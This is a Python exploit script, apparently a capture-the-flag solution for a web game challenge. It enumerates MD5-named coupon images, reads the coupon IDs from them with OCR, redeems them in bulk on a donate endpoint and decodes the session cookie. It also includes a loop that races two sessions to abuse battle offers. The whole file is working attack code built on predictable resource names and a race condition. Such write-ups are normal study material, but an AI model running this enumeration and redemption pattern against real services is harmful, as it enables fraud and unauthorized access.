import requests, time

from PIL import Image
import pytesseract
from hashlib import md5
from io import BytesIO
import re
import sys


from base64 import b64decode

s1 = requests.Session()
s2 = requests.Session()
s3 = requests.Session()






r1 = s1.post("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/login", data={'login':'terjanq7', 'password':'aaa','action':'save'})


def fight():
	while True:
		try:
			s2.get("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/game/battle/offer/2")
		except:
			pass
		try:
			s1.get("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/game/battle/accept/597")
		except:
			pass
		time.sleep(0.1)


def getMoney(coupon):
	r1 = s1.post('http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/', data={'coupon':coupon, 'action':'save'})
	b64 = r1.cookies['session'].split('.')[0]
	missing_padding = len(b64) % 4
	if missing_padding != 0:
		b64 += '='* (4 - missing_padding)

	print(b64decode(b64))
	


def tryCoupon(idd):
	hid = md5(str(idd).encode()).hexdigest()
	image = requests.get(f"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_{hid}.png")
	image = BytesIO(image.content);
	g = open(f"./coupons/coupon_{hid}.png", "wb");
	g.write(image.read());
	g.close()
	text = pytesseract.image_to_string(Image.open(image))
	return re.search('ID: (.+)', text).group(1)





for i in range(1000, 3000):
	try:
		ID = tryCoupon(i)
		getMoney(ID)
	except:
		pass


